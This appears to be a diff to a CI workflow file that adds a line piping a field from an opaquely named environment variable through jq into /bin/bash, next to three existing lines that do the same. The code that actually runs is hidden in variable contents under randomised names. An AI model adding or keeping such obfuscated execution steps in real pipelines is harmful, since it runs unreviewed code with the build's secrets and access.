@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$owvm3" | jq -r .hk3 | /bin/bash
           echo $czte25270 | jq -r .asb8896 | /bin/bash
           echo $s0 | jq -r .mhufs36 | /bin/bash
+          printf '%s' "$s66" | jq -r .tp22901 | /bin/bash
 
       - name: Save results
         if: always()
